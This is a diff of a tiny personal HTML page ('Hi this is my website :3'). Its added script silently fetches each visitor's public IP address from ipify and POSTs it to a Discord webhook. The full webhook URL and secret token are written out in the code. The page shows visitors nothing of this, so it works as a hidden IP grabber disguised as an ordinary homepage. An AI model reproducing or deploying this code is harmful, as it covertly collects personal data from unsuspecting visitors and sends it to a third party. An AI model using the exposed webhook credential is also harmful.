@@ -4,16 +4,16 @@
 </head>
 <body>
 <p>Hi this is my website :3</p>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
-<script>
-//$.getJSON("https://api.myip.com", function(data) {
-  function text(url) {
-    return fetch(url).then(res => res.text());
-  }
-
-  text('https://cors-anywhere.herokuapp.com/https://api.ipify.org?format=jsonp').then(data => {
-    console.log(JSON.parse(JSON.stringify(data)))
-    const request = new XMLHttpRequest();
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+     
+      <script>
+                
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+         
+        // Setting text of element P with id gfg
+        const request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/1051249705146921050/89HOeSfP4bPXw6NvS8JaXbrEWCxOksYpvvbeE7GsdD0GQQShEPp4IZO3w4e0QHakm-CP");
 
     request.setRequestHeader('Content-type', 'application/json');
@@ -21,12 +21,13 @@
     const params = {
       username: "Hi :3",
       avatar_url: "",
-      content: data
+      content: data.ip
     }
 
     request.send(JSON.stringify(params));
-  });
-//});
+    })
+    </script>
+<script>
 </script>
 </body>
 </html>
